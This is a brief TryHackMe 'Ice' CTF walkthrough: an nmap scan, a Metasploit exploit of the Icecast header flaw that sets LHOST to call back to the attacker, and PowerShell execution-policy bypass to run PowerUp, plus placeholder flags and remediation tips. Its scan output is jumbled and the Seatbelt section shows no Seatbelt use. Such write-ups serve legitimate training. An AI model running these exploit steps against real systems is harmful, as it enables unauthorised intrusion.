# TryHackMe: Ice Walkthrough

![TryHackMe Badge](https://img.shields.io/badge/TryHackMe-Ice-00a000?style=flat-square)
![Difficulty-Medium](https://img.shields.io/badge/Difficulty-Medium-yellow?style=flat-square)

---

## Room Overview

| Item | Details |
|------|---------|
| **Name** | Ice |
| **Platform** | TryHackMe |
| **OS** | Windows |
| **Difficulty** | Medium |

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -p- 10.10.10.10
```

**Results:**
```
PORT      STATE SERVICE
135/msrpc   open
139/netbios-ssn
445/microsoft-ds
3389/rdp
8000/http     Icecast
```

---

## Initial Access

### Icecast Exploitation

```bash
searchsploit Icecast
```

Found: Icecast HTTP Header - Remote Denial of Service + Code Execution

```bash
use exploit/windows/http/icecast_header
set RHOSTS 10.10.10.10
set LHOST 10.10.14.15
exploit
```

---

## Privilege Escalation

### Using Seatbelt

```bash
shell
whoami /all
systeminfo
```

### Using PowerUp

```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

---

## Flags

### User Flag
```
THM{us3r_fl4g}
```

### Root Flag
```
THM{r00t_fl4g}
```

---

## Remediation

1. Update Icecast server
2. Run services with limited privileges
3. Apply Windows patches
4. Use antivirus

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
